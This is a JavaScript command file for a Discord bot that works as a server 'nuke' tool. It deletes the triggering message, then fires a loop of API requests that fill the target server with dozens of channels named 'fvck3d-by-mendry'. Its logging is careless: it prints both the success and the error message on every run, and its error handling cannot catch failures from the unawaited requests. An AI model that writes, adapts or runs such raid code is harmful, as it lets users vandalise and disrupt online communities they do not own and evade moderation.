const axios = require("axios");
const config = require("../config.json");
const { MessageEmbed } = require("discord.js");

const token = config.token;
const cooldowns = new Map();

module.exports = {
    name: 'mass_channels',
    description: 'sex',
    async execute(message, args) {
        console.log(`[CONSOLE]: used **addch** in ${message.guild.name} by ${message.author.username} / ID: ${message.author.id}`);

        const successColor = '\x1b[32m';
        const errorColor = '\x1b[31m';
        const resetColor = '\x1b[0m';
        
        console.log(`${successColor}[success>]: channels successfully created${resetColor}`);
        
        console.error(`${errorColor}[ERROR]:an error occurred when creating the channels${resetColor}`);
        
        if (cooldowns.has(message.author.id)) {
            const cooldownExpiration = cooldowns.get(message.author.id);
            const remainingCooldown = (cooldownExpiration - Date.now()) / 1000;

            const embed = new MessageEmbed()
                .setTitle("Todos los canales creados correctamente gue")
                .setDescription(`no trates de spamear tanto el addch`)
                .setTimestamp();

            message.author.send(embed);
            return;
        }

        const cooldownTime = 300;
        cooldowns.set(message.author.id, Date.now() + cooldownTime * 1000);

        message.delete();

        const guild = message.guild.id;
        const channelsToCreate = parseInt(args[0]) || 50; 

        try {
            for (let i = 0; i < channelsToCreate; i++) {
                axios.post(`https://discord.com/api/v9/guilds/${guild}/channels`, {
                    name: `fvck3d-by-mendry`,
                    type: 0,
                }, {
                    headers: {
                        Authorization: `Bot ${token}`,
                        "content-type": "application/json",
                    },
                });
            }
        } catch (err) {
            if (err.response && (err.response.status === 429 || err.response.status === 403 || err.response.status === 400)) {
                return;
            }
        }
    }
};
